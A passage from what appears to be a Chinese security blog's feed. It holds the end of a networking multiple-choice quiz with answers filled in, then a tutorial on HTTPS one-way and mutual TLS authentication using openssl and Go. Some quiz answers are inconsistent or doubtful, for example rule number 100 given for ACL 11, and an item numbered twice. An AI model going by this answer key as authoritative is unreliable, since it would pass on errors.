-&gt;ROM-&gt;NVRAM</span><br><span class="line">C. ROM -&gt;NVRAM-&gt;FLASH</span><br><span class="line">D. FLASH -&gt;NVRAM-&gt;ROM</span><br></pre></td></tr></table></figure><p>41、<strong>以下对于缺省路由描述正确的是:( BC )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 缺省路由是优先被使用的路由</span><br><span class="line">B. 缺省路由是最后一条被使用的路由</span><br><span class="line">C. 缺省路由是一种特殊的静态路由</span><br><span class="line">D. 缺省路由是一种特殊的动态路由</span><br></pre></td></tr></table></figure><p>42、<strong>目前网络设备的 MAC 地址由(C )位二进制数字构 成, IP 地址由 ___位二进制数字构成</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 48, 16</span><br><span class="line">B. 64, 32</span><br><span class="line">C. 48, 32</span><br><span class="line">D. 48, 48</span><br></pre></td></tr></table></figure><p>43、<strong>在缺省的情况下, 如果一台路由器在所有接口同时运行 了 RIP 和 OSPF 两种动态路由协议, 下列说法中正确的是 : ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 针对到达同一网络的路径,在路由表中只会显示 RIP 发现的那一条,因为 RIP 协议的优先级更高 </span><br><span class="line">B. 针对到达同一网络的路径,在路由表中只会显示 OSPF 发现的那一条, 因为 OSPF 协议的优先级更高 </span><br><span class="line">C. 针对到达同一网络的路径,在路由表中只会显示 RIP 发现的那一条, 因为 RIP 协议的花费值 (metric ) 更小</span><br><span class="line">D. 针对到达同一网络的路径,在路由表中只会显示 OSPF 发现的那一条,因为 OSPF 协议的花费值 (metric )更小</span><br></pre></td></tr></table></figure><p>44、<strong>解决路由环问题的方法有 ( ABD )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 水平分割</span><br><span class="line">B. 触发更新</span><br><span class="line">C. 路由器重启</span><br><span class="line">D. 定义最大跳步数</span><br></pre></td></tr></table></figure><p>45、<strong>IP 报文头中固定长度部分为(B )字节</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 10</span><br><span class="line">B. 20</span><br><span class="line">C. 30</span><br><span class="line">D. 40</span><br></pre></td></tr></table></figure><p>46、<strong>一个 32位的 IP 地址与它的掩码作异或计算,所得到的 32位二进制数是此 IP 地址的 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. A 类地址</span><br><span class="line">B. 主机地址</span><br><span class="line">C. 网络地址</span><br><span class="line">D. 解析地址</span><br></pre></td></tr></table></figure><p>47、<strong>下面有关 HelloTime 时间间隔的配置,描述不正确的为 ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 较长的 HelloTime 可以降低生成树计算的消耗, 因为网桥可以不那么频繁的发送配置消息</span><br><span class="line">B. 较短的 HelloTime 可以在丢包率较高的时候,增 强生成树的健壮性,避免因为丢包而误认为链路 故障</span><br><span class="line">C. 过长的 HelloTime 会导致因为链路丢包而使网桥 认为链路故障,开始生成树重新计算</span><br><span class="line">D. HelloTime 配置的越短越好</span><br></pre></td></tr></table></figure><p>48、<strong>下列对生成树协议的理解正确的是:( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 生成树协议就是在交换网络中形成一个逻辑上的 树形结构,从而避免某些物理上的环路形成的交换网中的无用帧形成的拥塞</span><br><span class="line">B. 生成树协议实际已经在交换网络中形成了一个物 理上的树形结构</span><br><span class="line">C. 生成树协议状态一旦稳定,后续发送的数据包将 都沿着这个树形路径转发到目的地</span><br><span class="line">D. 生成树协议只是为了消除环路的存在,并不能提 供冗余备份地功能</span><br></pre></td></tr></table></figure><p>49、<strong>如下访问控制列表的含义是:( C )</strong></p><p>access-list 11 deny icmp 10.1.10.10 0.0.255.255 any host-unreachable</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 规则序列号是 100,禁止发送到 10.1.10.10主机 的所有主机不可达报文</span><br><span class="line">B. 规则序列号是 100,禁止发送到 10.1.0.0&#x2F;16网段 的所有主机不可达报文</span><br><span class="line">C. 规则序列号是 100,禁止从 10.1.0.0&#x2F;16网段发出 的所有主机不可达报文</span><br><span class="line">D. 规则序列号是 100,禁止从 10.1.10.10主机发出 的所有主机不可达报文</span><br></pre></td></tr></table></figure><p>50、<strong>OSPF 协议具有如下特点:( BCD )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 最多可支持近百台路由器</span><br><span class="line">B. 如果网络的拓扑结构发生变化, OSPF 立即发送更 新报文</span><br><span class="line">C. 算法本身保证了不会生成自环路由</span><br><span class="line">D. 区域划分减少了路由更新时占用的网络带宽</span><br></pre></td></tr></table></figure><p>51、<strong>RARP 的作用是 ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 将自己的 IP 地址转换为 MAC 地址</span><br><span class="line">B. 将对方的 IP 地址转换为 MAC 地址</span><br><span class="line">C. 将对方的 MAC 地址转换为 IP 地址</span><br><span class="line">D. 知道自己的 MAC 地址,通过 RARP 协议得到自己的 IP 地址</span><br></pre></td></tr></table></figure><p>52、<strong>在无盘工作站向服务器申请 IP 地址时, 使用的是 (B ) 协议</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. ARP</span><br><span class="line">B. RARP</span><br><span class="line">C. BOOTP</span><br><span class="line">D. ICMP</span><br></pre></td></tr></table></figure><p>53、<strong>当交换机检测到一个数据包携带的目的地址与源地址 属于同一个端口时,交换机会怎样处理? ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 把数据转发到网络上的其他端口</span><br><span class="line">B. 不再把数据转发到其他端口</span><br><span class="line">C. 在两个端口间传送数据</span><br><span class="line">D. 在工作在不同协议的网络间传送数据</span><br></pre></td></tr></table></figure><p>54、<strong>以下关于以太网交换机的说法哪些是正确的 ? ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 以太网交换机是一种工作在网络层的设备</span><br><span class="line">B. 以太网交换机最基本的工作原理就是 802.1D</span><br><span class="line">C. 生成树协议解决了以太网交换机组建虚拟私有网 的需求</span><br><span class="line">D. 使用以太网交换机可以隔离冲突域</span><br></pre></td></tr></table></figure><p>55、<strong>关于交换机交换方式的描述正确的是:( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 碎片隔离式交换:交换机只检查进入交换机端口 的数据帧头部的目的 MAC 地址部分,即把数据转发 出去</span><br><span class="line">B. 存储转发式交换:交换机要完整地接收一个数据 帧,并根据校验的结果以确定是否转发数据 </span><br><span class="line">C. 直通式交换:交换机只转发长度大于 64字节的数 据帧,而隔离掉小于 64字节的数据</span><br><span class="line">D. 这些说法全部正确</span><br></pre></td></tr></table></figure><p>56、<strong>下面哪些地址可以正确地表示 MAC 地址:( C )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 0067.8GCD.98EF</span><br><span class="line">B. 007D.7000.ES89</span><br><span class="line">C. 0000.3922.6DDB</span><br><span class="line">D. 0098.FFFF.0AS1</span><br></pre></td></tr></table></figure><p>57、<strong>(A )为两次握手协议,它通过在网络上以明文的 方式传递用户名及口令来对用户进行验证</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. PAP</span><br><span class="line">B. IPCP</span><br><span class="line">C. CHAP</span><br><span class="line">D. RADIUS</span><br></pre></td></tr></table></figure><p>58、<strong>如果需要配置一个交换机作为网络的根, 则应该配置下 面哪个参数 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 桥的 HelloTime</span><br><span class="line">B. 桥的优先级</span><br><span class="line">C. 该桥所有端口配置为边缘端口</span><br><span class="line">D. 将给该桥所有端口的路径花费配置为最小</span><br></pre></td></tr></table></figure><p>59、<strong>广播风暴是如何产生的 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 大量 ARP 报文产生</span><br><span class="line">B. 存在环路的情况下,如果端口收到一个广播报 文,则广播报文会增生从而产生广播风暴</span><br><span class="line">C. 站点太多,产生的广播报文太多</span><br><span class="line">D. 交换机坏了,将所有的报文都广播</span><br></pre></td></tr></table></figure><p>60、<strong>下面关于生成树协议的原理描述,哪个是错误的 ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 从网络中的所有网桥中,选出一个作为根网桥 (Root )</span><br><span class="line">B. 计算本网桥到根网桥的最短路径</span><br><span class="line">C. 对每个 LAN ,选出离根桥最近的那个网桥作为指定网桥,负责所在 LAN 上的数据转发</span><br><span class="line">D. 网桥选择若干个根端口,该端口给出的路径是此网桥到根桥的最佳路径</span><br></pre></td></tr></table></figure><p>61、 <strong>能正确描述了数据封装的过程的是 ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 数据段 -&gt;数据包 -&gt;数据帧 -&gt;数据流 -&gt;数据</span><br><span class="line">B. 数据流 -&gt;数据段 -&gt;数据包 -&gt;数据帧 -&gt;数据</span><br><span class="line">C. 数据 -&gt;数据包 -&gt;数据段 -&gt;数据帧 -&gt;数据流</span><br><span class="line">D. 数据 -&gt;数据段 -&gt;数据包 -&gt;数据帧 -&gt;数据流</span><br></pre></td></tr></table></figure><p>62、<strong>共享式以太网采用了(D )协议以支持总线型的结构</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. ICMP</span><br><span class="line">B. ARP</span><br><span class="line">C. SPX</span><br><span class="line">D. CSMA&#x2F;CD</span><br></pre></td></tr></table></figure><p>62、<strong>采用 CSMA/CD技术的以太网上的两台主机同时发送数据,产生碰撞时,主机应该做何处理 ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 产生冲突的两台主机停止传输,在一个随机时间 后再重新发送</span><br><span class="line">B. 产生冲突的两台主机发送重定向信息,各自寻找 一条空闲路径传输帧报文</span><br><span class="line">C. 产生冲突的两台主机停止传输,同时启动计时器, 15秒后重传数据</span><br><span class="line">D. 主机发送错误信息,继续传输数据</span><br></pre></td></tr></table></figure><p>63、<strong>集线器一般用于哪种网络拓扑中:( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 总线形</span><br><span class="line">B. 星形网络</span><br><span class="line">C. 环形网络</span><br><span class="line">D. 树形网络</span><br></pre></td></tr></table></figure><p>64、<strong>传输层协议端口号小于(C )的已保留与现有服务 一一对应,此数字以上的端口号可自由分配</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 100</span><br><span class="line">B. 199</span><br><span class="line">C. 1024</span><br><span class="line">D. 2048</span><br></pre></td></tr></table></figure><p>65、<strong>IP 协议的特征是 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 可靠 , 无连接</span><br><span class="line">B. 不可靠 , 无连接</span><br><span class="line">C. 可靠 , 面向连接</span><br><span class="line">D. 不可靠 , 面向连接</span><br></pre></td></tr></table></figure><p>66、<strong>可能会使用以下哪些信息实现地址转换 ( ABC )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. IP 地址</span><br><span class="line">B. TCP 端口号</span><br><span class="line">C. UDP 端口号</span><br><span class="line">D. 其他都不是</span><br></pre></td></tr></table></figure><p>67、<strong>D 类地址的缺省子网掩码有(D )位</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 8</span><br><span class="line">B. 16</span><br><span class="line">C. 24</span><br><span class="line">D. 没有子网掩码</span><br></pre></td></tr></table></figure><p>68、交换机如何知道将帧转发到哪个端口 ( A )</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;路由协议基础&quot;&gt;&lt;a href=&quot;#路由协议基础&quot; class=&quot;headerlink&quot; title=&quot;路由协议基础&quot;&gt;&lt;/a&gt;路由协议基础&lt;/h1&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="【0】基础知识" scheme="https://wintrysec.github.io/categories/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【5 网络基础】SSL双向认证</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/5%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BSSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/5%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BSSL%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/</id>
    <published>2020-08-12T12:05:00.000Z</published>
    <updated>2020-08-12T08:40:26.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Https单向认证和双向认证"><a href="#Https单向认证和双向认证" class="headerlink" title="Https单向认证和双向认证"></a>Https单向认证和双向认证</h1><p><strong>SSL/TLS是同一个东西的不同阶段</strong></p><blockquote><p>SSL 是英文 “Secure Sockets Layer” 的缩写，中文叫做“安全套接层”。</p><p>它是在上世纪90年代中期，由网景公司设计的。</p><p>到了1999年，<code>SSL</code> 因为应用广泛，已经成为互联网上的事实标准。</p><p>IETF 就在那年把 <code>SSL</code> 标准化，标准化之后的名称改为 TLS；</p><p>是“Transport Layer Security”的缩写，中文叫做 “传输层安全协议”。 </p></blockquote><h2 id="HTTPS利用对称与非对称加密算法结合的方式"><a href="#HTTPS利用对称与非对称加密算法结合的方式" class="headerlink" title="HTTPS利用对称与非对称加密算法结合的方式"></a><code>HTTPS</code>利用对称与非对称加密算法结合的方式</h2><blockquote><p><strong>对称加密</strong>：</p><p>就是通信双方使用一个密钥；该密钥既用于数据加密（发送方），也用于数据解密（接收方）</p><p>速度高，可加密内容较大，用来加密会话过程中的消息 </p><p><strong>非对称加密</strong>：</p><p>使用两个密钥；发送方使用公钥（公开密钥）对数据进行加密，数据接收方使用私钥对数据进行解密</p><p>速度慢，但能提供更好的身份认证技术，用来加密对称加密的密钥 </p></blockquote><h2 id="HTTPS连接建立过程："><a href="#HTTPS连接建立过程：" class="headerlink" title="HTTPS连接建立过程："></a><code>HTTPS</code>连接建立过程：</h2><blockquote><p>1、客户端发送支持的加密协议及版本，<code>SSL</code>、<code>TLS</code>（传输层安全性协议：<code>SSL</code>是<code>TLS</code>的前身）</p><p>2、服务器从中筛选合适的加密协议</p><p>3、服务器端返回证书，证书中有公钥</p><p>4、客户端使用根证书验证证书合法性</p><p>5、客户端生成对称密钥，通过证书中的公钥加密，发送到服务端</p><p>6、服务端使用私钥解密，获取对称密钥，使用对称密钥加密数据</p><p>7、客户端解密数据，<code>SSL</code>加密通信建立，开始通信……</p></blockquote><p><code>HTTPS</code>使用携带公钥信息的数字证书来保证公钥的安全性和完整性，并非直接传输公钥信息 </p><h2 id="单向认证："><a href="#单向认证：" class="headerlink" title="单向认证："></a>单向认证：</h2><blockquote><p>1、客户端发送SSL协议版本等信息</p><p>2、服务端返回SSL版本、随机数信息、以及服务器公钥(在ca证书中)</p><p>3、客户端使用根证书校验服务端证书合法性，合法继续，否则警告</p><p>4、客户端发送自己可支持的对称加密方案给服务端，供其选择</p><p>5、服务端选择加密程度高的方案</p><p>6、服务端将选择好的加密方案，明文发送给客户端</p><p>7、客户端收到加密方案，产生随机码，作为对称加密密钥，用服务端公钥加密，发给服务端</p><p>8、服务端使用私钥解密，获得对称加密密钥</p><p>9、对称加密通信数据，开始通信</p></blockquote><h2 id="双向认证："><a href="#双向认证：" class="headerlink" title="双向认证："></a>双向认证：</h2><p>双向认证和单向认证原理差不多，只是除了客户端需要认证服务端以外，增加了服务端对客户端的认证。</p><blockquote><p>1、客户端发送SSL协议版本等信息</p><p>2、服务端返回SSL版本、随机数信息、以及服务器公钥(在ca证书中)</p><p>3、客户端使用根证书校验服务端证书合法性，合法继续，否则警告</p><p><strong>4、客户端通过校验后，将自己的证书和公钥发给服务端</strong></p><p><strong>5、服务端校验证书，获得客户端公钥</strong></p><p>6、客户端发送自己可支持的对称加密方案给服务端，供其选择</p><p>7、服务端选择加密程度高的方案</p><p>8、服务端将选择好的加密方案，<strong>使用客户端公钥加密后</strong>，发送给客户端</p><p>9、客户端收到加密方案，产生随机码，作为对称加密密钥，用服务端公钥加密，发给服务端</p><p>10、服务端使用私钥解密，获得对称加密密钥</p><p>11、对称加密通信数据，开始通信</p></blockquote><h1 id="实验使用Golang模拟单向认证和双向认证"><a href="#实验使用Golang模拟单向认证和双向认证" class="headerlink" title="实验使用Golang模拟单向认证和双向认证"></a>实验使用Golang模拟单向认证和双向认证</h1><p>Go语言中有标准库<code>crypto/x509软件包</code>， 用于分析 <code>X.509</code> 编码的密钥和证书 </p><p>安装golang：<a href="https://studygolang.com/articles/6165" target="_blank" rel="noopener">https://studygolang.com/articles/6165</a></p><p>Go手册：<a href="https://cloud.tencent.com/developer/doc/1101" target="_blank" rel="noopener">https://cloud.tencent.com/developer/doc/1101</a></p><p>入门教程：<a href="https://github.com/jackhu1990/golangman" target="_blank" rel="noopener">https://github.com/jackhu1990/golangman</a></p><h2 id="单向认证，对服务端证书进行校验"><a href="#单向认证，对服务端证书进行校验" class="headerlink" title="单向认证，对服务端证书进行校验"></a>单向认证，对服务端证书进行校验</h2><p><strong>自签发证书，生成根证书</strong></p><p>根证书是CA认证中心给自己颁发的证书,是信任链的起始点.</p><p>这里我们自己做CA使用<code>openssl</code>命令来生成根证书. </p><p>首先建立我们自己的CA，需要生成一个CA私钥和一个CA的数字证书 </p><p><strong>生成CA私钥和CA证书</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br><span class="line">openssl req -x509 -new -nodes -key ca.key -subj <span class="string">"/CN=wintrysec_com"</span> -days 5000 -out ca.crt</span><br></pre></td></tr></table></figure><p><strong>然后生成server端的私钥，生成数字证书请求，并用我们的ca私钥签发server的数字证书</strong> </p><p>开始生成<code>X509</code>格式的自签名证书,会要求输入各项信息（国家，省份，城市，组织，姓名，email等 )</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out server.key 2048</span><br><span class="line">openssl req -new -key server.key -subj <span class="string">"/CN=localhost"</span> -out server.csr</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 5000</span><br></pre></td></tr></table></figure><p>现在我们的工作目录下，有以下私钥和证书文件：</p><blockquote><p>CA:</p><p>​    私钥文件 <code>ca.key</code></p><p>​    数字证书<code>ca.crt</code></p><p>Server:</p><p>​    私钥文件 <code>server.key</code></p><p>​    数字证书 <code>server.crt</code></p></blockquote><p><strong>服务端程序，<code>server.go</code>:</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义Web服务器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> </span><br><span class="line">&#123;</span><br><span class="line">    fmt.Fprintf(w,<span class="string">"这是HTTPS服务器页面，单向认证完成，我们可以通信了！"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">"/"</span>, handler)</span><br><span class="line">    http.ListenAndServeTLS(<span class="string">":8081"</span>,</span><br><span class="line">        <span class="string">"server.crt"</span>, <span class="string">"server.key"</span>, <span class="literal">nil</span>)</span><br><span class="line">        <span class="comment">//ListenAndServeTLS需要HTTPS连接，必须提供包含服务器证书和匹配私钥的文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>客户端程序，<code>client.go</code>:</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//client.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"crypto/tls"</span></span><br><span class="line">    <span class="string">"crypto/x509"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    pool := x509.NewCertPool()</span><br><span class="line">    caCertPath := <span class="string">"ca.crt"</span></span><br><span class="line"></span><br><span class="line">    caCrt, err := ioutil.ReadFile(caCertPath)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"ReadFile err:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    pool.AppendCertsFromPEM(caCrt)</span><br><span class="line"></span><br><span class="line">    tr := &amp;http.Transport&#123;</span><br><span class="line">        TLSClientConfig: &amp;tls.Config&#123;RootCAs: pool&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    client := &amp;http.Client&#123;Transport: tr&#125;</span><br><span class="line">    resp, err := client.Get(<span class="string">"https://localhost:8081"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"Get error:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="双向认证，对客户端证书进行校验"><a href="#双向认证，对客户端证书进行校验" class="headerlink" title="双向认证，对客户端证书进行校验"></a>双向认证，对客户端证书进行校验</h2><p>服务端可以要求对客户端的证书进行校验，以更严格识别客户端的身份，限制客户端的访问。</p><p>要对客户端数字证书进行校验，首先客户端需要先有自己的证书。</p><p><code>golang</code>的<code>tls</code>要校验<code>ExtKeyUsage</code>，可以在生成时指定<code>extKeyUsage</code> </p><p>创建<code>client.ext</code>，内容： <code>extendedKeyUsage=clientAuth</code> </p><p><strong>生成客户端的私钥与证书</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out client.key 2048</span><br><span class="line">openssl req -new -key client.key -subj <span class="string">"/CN=wintrysec_com"</span> -out client.csr</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -extfile client.ext -out client.crt -days 5000</span><br></pre></td></tr></table></figure><p><strong>服务端程序，<code>server.go</code>:</strong></p><p>server端要校验client端的数字证书，并且加载用于校验数字证书的<code>ca.crt</code></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"crypto/tls"</span></span><br><span class="line">    <span class="string">"crypto/x509"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> myhandler <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *myhandler)</span> <span class="title">ServeHTTP</span><span class="params">(w http.ResponseWriter,r *http.Request)</span></span> </span><br><span class="line">&#123;</span><br><span class="line">    fmt.Fprintf(w,</span><br><span class="line">        <span class="string">"这是HTTPS页面，双向认证完成，我们可以通信了!\n"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    pool := x509.NewCertPool()</span><br><span class="line">    caCertPath := <span class="string">"ca.crt"</span></span><br><span class="line"></span><br><span class="line">    caCrt, err := ioutil.ReadFile(caCertPath)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"ReadFile err:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    pool.AppendCertsFromPEM(caCrt)<span class="comment">//加载用于校验数字证书的ca.crt</span></span><br><span class="line"></span><br><span class="line">    s := &amp;http.Server&#123;</span><br><span class="line">        Addr:    <span class="string">":8081"</span>,</span><br><span class="line">        Handler: &amp;myhandler&#123;&#125;,</span><br><span class="line">        TLSConfig: &amp;tls.Config&#123;</span><br><span class="line">            ClientCAs:  pool,<span class="comment">//用于校验客户端证书</span></span><br><span class="line">            ClientAuth: tls.RequireAndVerifyClientCert,</span><br><span class="line">            <span class="comment">//通过将tls.Config.ClientAuth赋值为tls.RequireAndVerifyClientCert来实现Server强制校验client端证书</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = s.ListenAndServeTLS(<span class="string">"server.crt"</span>, <span class="string">"server.key"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"ListenAndServeTLS err:"</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>客户端程序，<code>client.go</code>:</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//client.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"crypto/tls"</span></span><br><span class="line">    <span class="string">"crypto/x509"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    pool := x509.NewCertPool()</span><br><span class="line">    caCertPath := <span class="string">"ca.crt"</span></span><br><span class="line"></span><br><span class="line">    caCrt, err := ioutil.ReadFile(caCertPath)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"ReadFile err:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    pool.AppendCertsFromPEM(caCrt)</span><br><span class="line"></span><br><span class="line">    cliCrt, err := tls.LoadX509KeyPair(<span class="string">"client.crt"</span>, <span class="string">"client.key"</span>)<span class="comment">//需要加载client.key和client.crt用于server端连接时的证书校验 </span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"Loadx509keypair err:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tr := &amp;http.Transport&#123;</span><br><span class="line">        TLSClientConfig: &amp;tls.Config&#123;</span><br><span class="line">            RootCAs:      pool,</span><br><span class="line">            Certificates: []tls.Certificate&#123;cliCrt&#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    client := &amp;http.Client&#123;Transport: tr&#125;</span><br><span class="line">    resp, err := client.Get(<span class="string">"https://localhost:8081"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"Get error:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Https单向认证和双向认证&quot;&gt;&lt;a href=&quot;#Https单向认证和双向认证&quot; class=&quot;headerlink&quot; title=&quot;Https单向认证和双向认证&quot;&gt;&lt;/a&gt;Https单向认证和双向认证&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;SSL/TLS是同一个东西的
      
    
    </summary>
    
    
      <category term="【0】基础知识" scheme="https://wintrysec.github.io/categories/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>【4 网络基础】HTTP协议</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%900%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%8BHTTP/"/>
